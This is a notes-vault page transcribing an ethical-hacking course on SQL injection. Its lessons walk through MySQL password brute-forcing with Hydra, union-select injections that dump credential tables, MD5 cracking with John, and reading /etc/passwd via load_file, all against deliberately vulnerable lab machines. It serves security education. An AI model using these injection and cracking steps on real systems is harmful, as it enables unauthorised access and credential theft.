---
type: course
cssclasses:
  - lle-course
  - lle-level-intermediate
slug: ethical-hacking-sql-injection
url: "https://www.linkedin.com/learning/ethical-hacking-sql-injection"
duration_minutes: 105
duration: 1h 45m
level: Intermediate
updated: 5/10/2023
learners: 43834
skills:
  - SQL Injection
  - Ethical Hacking
exercise_files: true
thumbnail: "https://media.licdn.com/dms/image/v2/C4D0DAQFjzkwOhEHRkA/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1635179468495?e=2147483647&amp;v=beta&amp;t=wjDhneIXwCuOs1LgVGK-b9o8Bi8_ZTxQ06gni-AZMSU"
linkedin_topic: Cybersecurity
learning_paths:
  - '[Become an Ethical Hacker](../../Paths/Cybersecurity/Learning%20Paths/Become%20an%20Ethical%20Hacker.md)'
prev_courses:
  - '[Ethical Hacking- Cloud Computing](Ethical%20Hacking-%20Cloud%20Computing.md)'
path_nav: '[{"path":"Become an Ethical Hacker","position":19,"total":19,"prev":"Ethical Hacking- Cloud Computing","next":null}]'
path_count: 1
tags:
  - course
  - topic/security
  - topic/network-and-system-administration
  - skill/sql-injection
  - skill/ethical-hacking
status: not-started
created: 2026-05-03
---

> <!-- lle:github-source --> [View this note on GitHub](https://github.com/thisis-romar/linkedin-learning-vault/blob/github-browse/Courses/Cybersecurity/Ethical%20Hacking-%20SQL%20Injection.md)

![Ethical Hacking: SQL Injection](https://media.licdn.com/dms/image/v2/C4D0DAQFjzkwOhEHRkA/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1635179468495?e=2147483647&amp;v=beta&amp;t=wjDhneIXwCuOs1LgVGK-b9o8Bi8_ZTxQ06gni-AZMSU)

# Ethical Hacking: SQL Injection

> SQL injections are a common way to gain unauthorized access to web applications and extract data from them. In this course, instructor Malcolm Shore shows you the SQL command language and how it is used by attackers to craft SQL Injections. Malcolm begins with commonly encountered relational databases and the basics of the SQL command language. Then he focuses on advanced SQL commands that may be 

> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-sql-injection) | 1h 45m | Intermediate | 44K learners
> [Jump to Path Context ↓](#path-context)

## Table of Contents

### Chapter Overview

- [**Introduction**](#introduction) (3 videos)
  - [Understanding how SQL injections work](#understanding-how-sql-injections-work)
  - [What you should know](#what-you-should-know)
  - [Disclaimer](#disclaimer)
- [**1. SQL Basics**](#1-sql-basics) (4 videos)
  - [Starting with SQL](#starting-with-sql)
  - [Creating a MySQL database](#creating-a-mysql-database)
  - [Using SQL](#using-sql)
  - [Finding the SQL password](#finding-the-sql-password)
- [**2. Testing for SQL Injections**](#2-testing-for-sql-injections) (6 videos)
  - [Checking out the Security Shepherd](#checking-out-the-security-shepherd)
  - [Injecting Mutillidae](#injecting-mutillidae)
  - [Deep diving the target with SQLi](#deep-diving-the-target-with-sqli)
  - [Cracking the MySQL hash](#cracking-the-mysql-hash)
  - [Injecting Microsoft SQL Server](#injecting-microsoft-sql-server)
  - [Injecting Oracle SQL Server](#injecting-oracle-sql-server)
- [**3. Automating SQL Injection Exploits**](#3-automating-sql-injection-exploits) (10 videos)
  - [Inferring TRUE when blind](#inferring-true-when-blind)
  - [Using prepared SQL queries](#using-prepared-sql-queries)
  - [Getting our first sqlmap injection](#getting-our-first-sqlmap-injection)
  - [Sanitizing input to SQL](#sanitizing-input-to-sql)
  - [Inserting an SQL injection via Burp Suite](#inserting-an-sql-injection-via-burp-suite)
  - [Following up with a second injection](#following-up-with-a-second-injection)
  - [Defeating the WAF](#defeating-the-waf)
  - [Navigating a complex injection](#navigating-a-complex-injection)
  - [Using request messages to inject SQL](#using-request-messages-to-inject-sql)
  - [Checking out SQLI Labs](#checking-out-sqli-labs)
- [**Conclusion**](#conclusion) (1 videos)
  - [What's next?](#whats-next)

### Introduction

[↑ Back to Table of Contents](#table-of-contents)

#### [Understanding how SQL injections work](https://www.linkedin.com/learning/ethical-hacking-sql-injection/understanding-how-sql-injections-work?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/understanding-how-sql-injections-work?u=76281980&t=0)** - With the dominance of cloud and [software as a service](../../Glossary/Concept/SaaS.md) delivery web portals are now the dominant means of accessing applications and are often supported by a backend [SQL server](../../Skills/Software%20Development/Microsoft%20SQL%20Server.md). With the prevalence of [SQL](../../Skills/Data%20Science/SQL.md), adversaries will look for every opportunity to take advantage of unprotected SQL based applications to gain access to our information and systems. We need to protect our systems and that means understanding the basics of the SQL language and understanding how it can be used to penetrate our systems. I'm Malcolm Shore and I've spent a career helping governments and businesses protect their systems. I'd like to invite you to take this course and learn how SQL injections work. Now let's get started with SQL injections.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (5), [Software as a service](../../Glossary/Concept/SaaS.md) (1), [Sql server](../../Skills/Software%20Development/Microsoft%20SQL%20Server.md) (1)
> **Env Vars:** sql (6)
> **Speakers:** - with (1)

#### [What you should know](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-you-should-know?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-you-should-know?u=76281980&t=0)** - [Instructor] This is a practical course and we'll be using [Kali Linux](../../Skills/Cybersecurity/Kali%20Linux.md)-based tools to do testing, and we'll be using targets in the Offensive Security and Hack The Box online [Penetration Testing](../../Skills/Cybersecurity/Penetration%20Testing.md) labs. Where possible, I'll use the free subscription targets in these labs. But some of the more complex targets will be in the main labs. You should be competent in [Windows](../../Glossary/Service/Windows.md) and Unix host technologies. A good understanding of HTTP and the [SQL](../../Skills/Data%20Science/SQL.md) language would be an advantage. You'll need to have a good working knowledge of Kali and some hands-on experience of testing. You should have a working knowledge of web testing tools, and you should have taken the [Ethical Hacking](../../Skills/Cybersecurity/Ethical%20Hacking.md): [Web Servers](../../Skills/Web%20Development/Web%20Servers.md) and Applications course. And if you've taken the Advanced Web Testing course, that would be an advantage.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Kali Linux](../../Skills/Cybersecurity/Kali%20Linux.md) (1), [Penetration Testing](../../Skills/Cybersecurity/Penetration%20Testing.md) (1), [Windows](../../Glossary/Service/Windows.md) (1), [SQL](../../Skills/Data%20Science/SQL.md) (1), [Ethical Hacking](../../Skills/Cybersecurity/Ethical%20Hacking.md) (1)
> **Env Vars:** http (1), sql (1)
> **Definitions:** is a  (1)
> **Prerequisites:** you'll need (1)
> **Speakers:** - [instructor] (1)

#### [Disclaimer](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/disclaimer?u=76281980&t=0)** - [Instructor] This is one of a series of advanced [Penetration Testing](../../Skills/Cybersecurity/Penetration%20Testing.md) courses. And in addition to [Kali Linux](../../Skills/Cybersecurity/Kali%20Linux.md), it uses some third-party testing software. While we've done our best to ensure that the tools we use and the sites we reference are legitimate, testing sites can be targets for hackers and we can't provide any assurance that these sites might not be compromised when you visit them. Some of the sites which store the testing tools are detected as dangerous because the tools have similar signatures to malware and may raise antivirus alerts when you visit them. The testing tools we use are extremely powerful. They may demonstrate some of the same signature characteristics as malware and malicious implants and may raise antivirus alerts when you try to download them. Again, we can't provide assurance that the software hasn't been compromised when you download it. And so as for any other software from the internet, you need to exercise due diligence and take personal responsibility for anything you load into your system. The testing we do is mostly carried out inside a virtual environment to contain any unplanned effects of testing tools. And in the unlikely event that you do download malware, this will also help contain any impact.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [Penetration Testing](../../Skills/Cybersecurity/Penetration%20Testing.md) (1), [Kali Linux](../../Skills/Cybersecurity/Kali%20Linux.md) (1)
> **Speakers:** - [instructor] (1)


### 1. SQL Basics

[↑ Back to Table of Contents](#table-of-contents)

#### [Starting with SQL](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=0)** - [Instructor] In the early days of computing, we wrote applications which managed data records. The applications were typically written in COBOL, and the records were in an index sequential or ISAM file. There's still many of these applications around today in government and industry. However, times moved on, and in the 1980s, a new form of [Data Management](../../Skills/Software%20Development/Data%20Management.md) emerged, called [Relational Databases](../../Skills/Software%20Development/Relational%20Databases.md). Relational databases consists of data held in records, as they were in ISAM, but designed in such a way as to have relational links between fields in one part of the database and key identification fields in another. This meant that instead of repeating, for instance, Buoy in the town field, we could have a separate area of towns with Buoy, been represented by say 2-0-7-1-5 and its record containing all the relevant town attributes in relational database terminology. We call these separate parts of the database tables. Then whenever we need to have Buoy in a record, we can just reference it as 2-0-7-1-5 and look it up in the towns table when we need further details. There's a fair bit of theory around design of relational databases, but we won't be covering that in this course. In order to understand [SQL](../../Skills/Data%20Science/SQL.md), we need to get hands-on. So let's jump straight into it and start using SQL. Carly comes with the [MySQL](../../Skills/Software%20Development/MySQL.md) server already loaded, so all we need to do is start it. We can do that by entering the command, service, MySQL, start,
>
> **[1:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=93)** and we'll enter our root password. Now the service is started we can use the interactive client by entering, pseudo, MySQL
>
> **[1:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=105)** - U, root. Okay we now have an SQL prompt and it's showing we using Maria DB. To be accurate Maria DB isn't MySQL, but it is a variant that's evolved from MySQL and for all intents and purposes they're the same. We're in SQL now, so let's see what [Databases](../../Skills/Software%20Development/Databases.md) we can connect to. We use the show database command for that and terminate it with a semi-colon. Show, databases. And we can see, we have the information schema, MySQL, and performance schema databases. Let's explore these, firstly we'll connect to information schema. We do that by saying use, information, schema, and we can list the tables in this database by saying show, tables. We can see there's quite a lot of tables here. Let's take a look at one of them with the command, select, star, from INODB, SYS, tables, and we've listed the full record, but we could just list the table on ID by saying, select, table, ID, comma, name, from INODB, SYS, tables.
>
> **[3:19](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=199)** The fields and command words aren't case sensitive, but we'll often see command words in capitals by convention. Let's take a look at the, MySQL database. Use MySQL, show, tables. We've got a few tables here also including one called user. Let's check what data fields are in the table. Show, columns, from, user. And we've got a few columns as well, including, two fields called user and password, let's list them. Select, user, comma, password, from, user, and we can see just the root user with a blank password. Let's now create a user account called Marcus. We can do that with the grant statement and we'll set the password to Marcus also. Grant, all, privileges, on startup star, to, Marcus, at, local host, identified,
>
> **[4:52](https://www.linkedin.com/learning/ethical-hacking-sql-injection/starting-with-sql?u=76281980&t=292)** by, Marcus. And now when we list the users, we can see we have the root user and also the Marcus account with its password hash. Okay. We've made a good start on using my SQL.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [MySQL](../../Skills/Software%20Development/MySQL.md) (8), [SQL](../../Skills/Data%20Science/SQL.md) (5), [Relational Databases](../../Skills/Software%20Development/Relational%20Databases.md) (3), [Databases](../../Skills/Software%20Development/Databases.md) (3), [Data Management](../../Skills/Software%20Development/Data%20Management.md) (1)
> **Env Vars:** sql (5), isam (2), inodb (2), sys (2), cobol (1)
> **CLI Commands:** mysql (8)
> **Speakers:** - [instructor] (1), - u (1)
> **Definitions:** is a  (1)
> **Analogies:** for instance (1)

#### [Creating a MySQL database](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=0)** - Let's now log into my [SQL](../../Skills/Data%20Science/SQL.md) as our new user Marcus and create a database to use for this course. My SQL minus you Marcus minus P and then to our password which is also Marcus. And we're now in my SQL as the user Marcus. We'll create a new database. Create database called cleo. And then we'll make it our current database. Use Cleo and we'll list the tables. Show tables. And we see it's an empty set because we haven't created any tables in this database yet. Let's build the tables next. We want our database to consist of three tables. One containing the basic details of Egyptian Pharaohs. The second of the dynastic seat of power during the Pharaohs reign and the third the tomb where the Pharaoh was found. So let's create table Pharaoh and we'll put in columns, Pharaoh ID, which is an INT, name, which is a VARcharacter, variable character of length 32, reign start, which is an INT, reign, end which is an INT.
>
> **[1:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=94)** The dynasty, which is an INT and the tomb, which is again, a variable character field of length hates in this case. Okay. And we'll create our table. Dynasty and we'll put in the fields. Dynasty ID which is an INT. The seat of power, which is a VARchar 20 and commentary, which is a VARchar 64. And finally we'll create table tomb which is tomb ID VARchar eight and again the commentary of VARchar 64. We now need to load the tables which we can do by using the files in your exercise folder. These are common delimited files containing the database information. We can see here, the Pharaoh dot text file. Okay so we load those files by saying load data local Infile Pharaoh dot text into table Cleo dot
>
> **[3:09](https://www.linkedin.com/learning/ethical-hacking-sql-injection/creating-a-mysql-database?u=76281980&t=189)** Pharaoh Fields terminated by quote comma quote and semi-colon. And that's loaded. And we do the same load data local Infile dynasty dot text into table Cleo dot dynasty fields terminated by comma and finally load data local Infile tomb block text into table Cleo dot tomb fields terminated by comma. Okay we've now got our database set up. Just before we go, let's look at the contents of the tomb table. Select star from tomb. And get a formatted listing over the records in the tomb table.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (3)
> **Env Vars:** int (5), sql (3)
> **Definitions:** is an  (5), is a  (3)
> **CLI Commands:** make (1)
> **Prerequisites:** set up (1)
> **Speakers:** - let (1)

#### [Using SQL](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=0)** - Now we've got our [SQL](../../Skills/Data%20Science/SQL.md) database set up. Let's see how we use it. We've already seen how to list all records in a database. Let's see how we select just a subset of the table. Select star from Pharaoh, where the dynasty equals 23. And we get just those pharaohs who ruled in the 23rd dynasty. We can look at partial matches using the percent sign. Select star from Pharaoh, where name like Shoshenq, percent. And we get Shoshenq one to five. We can change a field by using the update command. Update, Pharaoh set dynasty equals zero, where name equals Shoshenq three. Let's look at the Shoshenq family again, and we can see Shoshenq three has a zero dynasty value. Let's set that back to what it was originally. Set dynasty equals 23, where name is Shoshenq the third.
>
> **[1:38](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=98)** We can also add records using the insert verb ,and delete records using the delete verb. And we can remove tables using the drop command. I won't run these, but you can check them out yourself. Another useful SQL command is the System command, which enables us to run Bash or [Windows](../../Glossary/Service/Windows.md) commands. For instance, we can do a folder listing by saying system LS minus AL, and we get the folder listing. The join verb allows us to connect the relevant table entry from a second table where we have a reference, for example, select star from Pharaoh in a join dynasty on Pharaoh dot dynasty equals dynasty dot did. And we get an extended table which contains all columns. We can combine that with our, where clause also. Select with the inner join, where name like Shoshenq percent. We don't have to return all columns. We can specify what we want. So instead of select star
>
> **[3:13](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=193)** on our join, we can select Pharaoh ID, name, and seat from Pharaoh in a join dynasty on Pharaoh dot dynasty dot did where name is like Shoshenq. There's another useful verb we can use called Union. This combines multiple selects into a single output. Select phid comma name from Pharaoh where name like Shoshenq. Union select again, phid comma name from Pharaoh. Where name like Ptolemy. And we get the Shoshenq and Ptolemy families. The union verb is normally used to combine two separate tables. We can use logical operators. Let's do our selective of the Shoshenqs again. Select star from Pharaoh where name like
>
> **[4:49](https://www.linkedin.com/learning/ethical-hacking-sql-injection/using-sql?u=76281980&t=289)** Shoshenq. Now let's do that again with an or statement, select star from Pharaoh, where name like Shoshenq or one equals one. And we get the whole table. This is because one always equals one. We can also use the expression True. Select star from Pharaoh where name like Shoshenq percent or true. And we get the full table again. Okay, we've now got sufficient understanding of SQL to go do some SQL injection.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (4), [Windows](../../Glossary/Service/Windows.md) (1)
> **Env Vars:** sql (4)
> **Analogies:** for instance (1), for example (1)
> **CLI Commands:** ls (1)
> **Tools:** bash (1)
> **Prerequisites:** set up (1)
> **Speakers:** - now (1)

#### [Finding the SQL password](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=0)** - [Narrator] Before we get into [SQL](../../Skills/Data%20Science/SQL.md) injection proper. Let's take a look at another way of accessing SQL [Databases](../../Skills/Software%20Development/Databases.md). If we have access to the service on port 3306, we can check that by running "[Nmap](../../Glossary/Tool/Nmap.md)" on port 3306, and we can see it's open. We'll use our local kali system on "127.0.0.1", but we could be doing the same attack on a remote server. Let's assume we know there's a user called Marcus, and we may have got that from email. We'll need a set of potential passwords, and we can use the standard kali "rockyou.txt". We'll use the hydro tool, to attempt to brute force our way in, "[Hydra](../../Glossary/Tool/Hydra.md),
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=41)** - l, Marcus,
>
> **[0:44](https://www.linkedin.com/learning/ethical-hacking-sql-injection/finding-the-sql-password?u=76281980&t=44)** - P", and we'll use a password file, user, share, wordlists, "rockyou.txt", and we'll run that against "127.0.0.1", my SQL service. And we can say it's attacking "127.0.0.1" on port 3306, and it very quickly finds that the password is also Marcus. If we don't know the username, we can try a list of usernames. I have a small file set up called "names.txt", "catnames.txt", and we just have the four in there. Let's run them through again. In this case, we'll use capital L, "names.txt", and the "-u" to loop around usernames first, and we'll again, use 'rockyou.txt" as our password file, and we found our password for Marcus once again. Okay, so like any other service, if we have weak passwords, then we could well be exposed to an SQL breach, even without our attackers resorting to injections.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (4), [Databases](../../Skills/Software%20Development/Databases.md) (1), [Nmap](../../Glossary/Tool/Nmap.md) (1), [Hydra](../../Glossary/Tool/Hydra.md) (1)
> **File Paths:** rockyou.txt (3), names.txt (2), catnames.txt (1)
> **Env Vars:** sql (4)
> **Ports:** port 3306 (3)
> **Versions:** 127.0.0 (3)
> **Speakers:** - [narrator] (1), - l (1), - p (1)
> **Prerequisites:** set up (1)


### 2. Testing for SQL Injections

[↑ Back to Table of Contents](#table-of-contents)

#### [Checking out the Security Shepherd](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=0)** - [Host] The [OWASP](../../Skills/Cybersecurity/OWASP.md) folks have provided another training tool, which we can use for [SQL](../../Skills/Data%20Science/SQL.md) injections. It's the security shepherd, described on the website here. This comes as a virtual machine and you import it as an appliance into virtual box. I've downloaded and imported it. It's running on IP address ten dot naught dot two dot nineteen and we're ready to go. I'll set my browser to proxy by going to preferences, network settings, and manual proxy configuration. Okay. And I'll start [Burp Suite](../../Skills/Cybersecurity/Burp%20Suite.md). I'll switch off proxy interception, and I'll set the target scope to ten dot naught dot two dot nineteen. Okay. I'll browse to ten dot naught dot two dot nineteen, and I'll accept the risk. And here we have the security shepherd login screen. When you do first start it up, You'll want to log in as admin with the password "password" and submit, and you'll be asked to change the password. Okay. Let's select the admin button and module management
>
> **[1:33](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=93)** and we'll change the module layout. I'll set the configuration to open floor mode and I'll refresh the browser and I'll open all levels. Okay. You may want to log out and register a user account, or you can continue with using the admin account. Let's just get into it and have a look at the challenges. Now select the third one down, injections. Let's run the first challenge, [NoSQL](../../Skills/Software%20Development/NoSQL.md) injection one. This is a Mongo DB NoSQL injection. And we can see that we're presented just with a button to press. And when we do, we see Jimmy's gamer ID. However, the challenge is to find Marlo's game ID. We can't do anything at this screen, but let's take a look in burp suite. When we look at the post message, we can see that it's a simple request, which contains data starting with the gamer name equals followed by what we saw as the ID. Let's send this to the repeater and go to the repeater tab and then add a quote to the end of the message and press send. Okay. We can see that we've got a Mongo DB error. This shows that we're able to inject. Let's try adding to the quote, our normal force true injection
>
> **[3:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=185)** or quote a quote equals quote a and send. Okay, we still get an error. So we can't force it to evaluate as true this way. However, if we think this may be executed in a script, then we can try to add a forced return as an injected command and terminate the string as we normally would. There's a number of scripting options to try. And when we add and the inquiry return true, and then we'll add var a equals quote a to finish off the final quote that we expect to be in the message. Okay, let's send that. And this time we get the full set of results. We can stop here and manually extract the information, or we can select action request in browser in original session copy the URL and in our browser tab paste it. And we get the formatted information. We can copy the Marlo gamer ID, paste it and submit it. And we've completed the task. Let's try one more. We'll try SQL injection one. Here we have a form request for an ID.
>
> **[4:39](https://www.linkedin.com/learning/ethical-hacking-sql-injection/checking-out-the-security-shepherd?u=76281980&t=279)** So let's try our normal query again. twenty one or one equals one dash dash and get user. And we found no results. Let's change that to use a double quote, just in case that's the way the expression is and get user. And we've got the results. And our result key with a slight misspelling can be copied and pasted and submit. This is a simple force true injection. We've exploited a couple of the SQL injection features of security shepherd, but there's more to work on, on your SQL injection and indeed on your wider web testing skills.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [SQL](../../Skills/Data%20Science/SQL.md) (4), [Burp Suite](../../Skills/Cybersecurity/Burp%20Suite.md) (2), [NoSQL](../../Skills/Software%20Development/NoSQL.md) (2), [OWASP](../../Skills/Cybersecurity/OWASP.md) (1)
> **Env Vars:** sql (4), owasp (1), url (1)
> **CLI Commands:** mongo (2), find (1)
> **UI Navigation:** select the (2), go to (1)
> **Definitions:** is a  (2)
> **Speakers:** - [host] (1)

#### [Injecting Mutillidae](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=0)** - [Instructor] Let's take a look at the Metasploitable server. Before we get into [SQL](../../Skills/Data%20Science/SQL.md), we need to update the database details in Metasploitable. I've logged in and navigated to var/www/mutillidae and will sudo nano config.inc. And I'll go down and change the database name from [Metasploit](../../Glossary/Framework/Metasploit.md) to owasp10, and save that, and we're ready to start. If we run an [Nmap](../../Glossary/Tool/Nmap.md) against port 3306 on Metasploitable, nmap -PS -A 10.0.2.8 -p3306,
>
> **[0:48](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=48)** we find it's open and running [MySQL](../../Skills/Software%20Development/MySQL.md) 5.0.51a. The first thing we'll try to do now is access to the [SQL server](../../Skills/Software%20Development/Microsoft%20SQL%20Server.md) remotely with the default root account. MySQL -h 10.0.2.8 -u root,
>
> **[1:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=71)** and we get in. We can now check the [Databases](../../Skills/Software%20Development/Databases.md). Show databases. And let's use MySQL. And look at its tables, show tables. And we'll select user, password from the user table.
>
> **[1:42](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=102)** And we see that we have three users with no password set. Let's connect to Metasploitable and select Mutilidae. And we can look at the [OWASP](../../Skills/Cybersecurity/OWASP.md) top 10 injection extract data user information. We're presented with a login screen, and we can always try admin, admin, but that doesn't work. So let's now try an injection into the username field. sam or True.
>
> **[2:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=141)** And the injection works and we have 16 records listed. Now we included the hash or pound sign at the end of the injection so that the remainder of the query, including the password check is commented out. We could also have used two dashes in place of the hash or pound sign. Let's now try a union and see what we can do with this. Firstly, we need to have the same number of columns as are in the main database, but we don't know how many there are. We can work it out using a special trick with the order by clause. Sam' or True order by 1,
>
> **[3:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=182)** and view account details. And as expected, we have the 16 records ordered by the first field. Now let's order it on column two, sam' or True order by 2,
>
> **[3:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=200)** and that also works. And we carry on like this, sam' or True order by 3,
>
> **[3:34](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=214)** which works. sam or True order by 4,
>
> **[3:45](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=225)** which works. sam' or True order by 5,
>
> **[3:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=236)** which works. sam' or True order by 6,
>
> **[4:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=248)** which fails. So we can order on column five, but not on column six. So now we know there are five columns being extracted from the database. Let's try using the union select injection. sam' or True union select 1, 2, 3, 4, 5,
>
> **[4:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=275)** and view account details. We now have 17 records, including the bottom 2, 3, 4. So we know we selecting five columns on the selection and printing out columns, two, three, and four. Let's now change our injection, and we can drop some of the sam and the or true and just inject union select, we don't want the first column, but we want to show database, user and version,
>
> **[5:17](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=317)** and we need to put in the fifth column. And we now get out our database owasp10, the user root@localhost and the version of MySQL. So we've injected into the database and we've pulled out database functions. We can retrieve database information using the same technique. Let's see what tables we've got. We can do a union select ignore column one, and we'll now print out table schema and table name,
>
> **[6:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=360)** and we won't worry about column four or five,
>
> **[6:08](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=368)** from information_schema.tables,
>
> **[6:20](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=380)** and view account details. We've got a lot of records found, we have 430 tables, and we can see as we go through them, our user's table in DVWA, our normal user table in MySQL, and we have an accounts table in owasp10. These might all be of interest to us. Let's try that injection again, and this time, we'll say union select column one, and we want to print column name.
>
> **[7:06](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=426)** And we're not interested in printing anything else in columns, three, four, and five. And we're going to print that from information_schema.columns,
>
> **[7:23](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=443)** where, table name equals accounts. And that's the end of our injection. And we have five records found with username and password showing. We can now extract our database contents. Again, run a union select, nothing in column one, username in column two, password in column three, and nothing in column four or five. And we'll extract that from accounts.
>
> **[8:11](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=491)** And we get the credentials with the passwords being in plain text. Let's run the injection again to extract column names this time from the users table in the DVWA database. union select column one, column name, I think columns three, four or five from information_schema.columns,
>
> **[8:53](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=533)** where table name equals users.
>
> **[9:04](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=544)** This time we have six records found, and we can see a user and password column. We can now extract the database contents again. While we don't need to, in this case, sometimes we may only be able to extract a single column. And in that case, we can use the concatenation function. Let's see how we do that. union select, don't worry about column one, and then we'll put concat and, I'll be doing contact twice because I want to concatenate three items. I'll take the user 0X3A hexadecimal 3A, and then concatenate both of those with password. And then I don't worry about columns three, four, or five. Extract those from in this case, dvwa.users.
>
> **[10:10](https://www.linkedin.com/learning/ethical-hacking-sql-injection/injecting-mutillidae?u=76281980&t=610)** And we've now got the user and password details. And we can see the password column holds password hash. I've put the set of user password information into a file called dvpass. Let's go crack them with [John the Ripper](../../Glossary/Tool/John%20the%20Ripper.md). [john](../../Glossary/Tool/John%20the%20Ripper.md) dvpass, and we'll tell John that the format is raw-MD5. Although John could work that out for himself. And very quickly, we find the passwords. admin's password is password as is smithy's, gordonb is abc123, pablo is letmein, and charley is 1337. And we can show them of John the Ripper and getting them listed.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [MySQL](../../Skills/Software%20Development/MySQL.md) (5), [John](../../Glossary/Tool/John%20the%20Ripper.md) (3), [Nmap](../../Glossary/Tool/Nmap.md) (2), [Databases](../../Skills/Software%20Development/Databases.md) (2), [John the Ripper](../../Glossary/Tool/John%20the%20Ripper.md) (2)
> **CLI Commands:** mysql (5), find (2), sudo (1)
> **Env Vars:** sql (2), dvwa (2), owasp (1), md5 (1)
> **Code Identifiers:** information_schema (3)
> **Versions:** 10.0.2 (2), 5.0 (1)
> **Ports:** port 3306 (1)
> **Speakers:** - [instructor] (1)

#### [Deep diving the target with SQLi](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-sql-injection/deep-diving-the-target-with-sqli?u=76281980&t=0)** - Now we know how to use union select to achieve an injection. Let's see how we can access operating system functions using the union select clause union select, and we'll use the load file function and we'll ask it to load slash etc, slash password comma. No, no. And finish our injection. And we get one record found, which is the data from our etc password file. So now we have a way of listing files. We can also store files on the target. Let's store some texts in a file in the temp folder, union select. This is my test data, 2, 3, 4, 5, and we use into out file slash tmp slash my test. Okay. And view account details that username or password. And if we check on meta sploitable,
>
